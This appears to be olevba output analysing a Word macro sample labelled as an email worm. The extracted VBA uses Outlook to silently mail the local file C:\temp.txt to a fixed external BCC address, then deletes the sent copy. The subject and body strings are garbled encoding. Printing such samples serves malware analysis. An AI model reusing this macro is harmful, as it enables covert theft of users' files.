olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Email-Worm.MSWord.Small.a-592c7064d4baa291cfb758f5e17b070ccfa379ad
Type: Text
-------------------------------------------------------------------------------
VBA MACRO Email-Worm.MSWord.Small.a-592c7064d4baa291cfb758f5e17b070ccfa379ad 
in file: Email-Worm.MSWord.Small.a-592c7064d4baa291cfb758f5e17b070ccfa379ad - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Set A10 = CreateObject( "Outlook.Application") 
Set A13 = A10.CreateItem(0)
A13.BCC = "nestorpb@nestor.minsk.by"
A13.Subject = "����� �� ������ � VBScript"
A13.Body = "������� �� ������." & Chr(13) & Chr(10) & "Regards."
A13.Attachments.Add "C:\temp.txt"
A13.DeleteAfterSubmit = True
A13.Send
A13.Quit
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
+----------+--------------------+---------------------------------------------+

